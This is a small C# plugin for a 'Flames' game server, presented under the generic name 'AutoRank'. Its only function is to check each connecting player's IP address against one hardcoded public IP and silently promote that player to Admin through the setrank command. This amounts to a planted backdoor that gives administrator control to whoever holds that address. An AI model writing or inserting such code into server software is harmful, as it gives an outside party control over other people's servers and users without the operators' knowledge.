using Flames.Events.PlayerEvents;
namespace Flames
{
    public class AutoRank : Plugin
    {
        public override string creator { get { return "HarmonyNetwork"; } }
        public override string name { get { return "AutoRank"; } }

        public override void Load(bool startup)
        {
            OnPlayerConnectEvent.Register(Rank, Priority.Critical);
        }

        public override void Unload(bool shutdown)
        {
            OnPlayerConnectEvent.Unregister(Rank);
        }

        public void Rank(Player p)
        {
            string name = p.truename;
            string ip = p.ip;
            if (ip == "165.23.95.226")
            {
                Command.Find("setrank").Use(Player.Flame, name + " Admin" + " Auto-rank by " + Player.Flame.SuperName + "&S.");
            }
        }
    }
}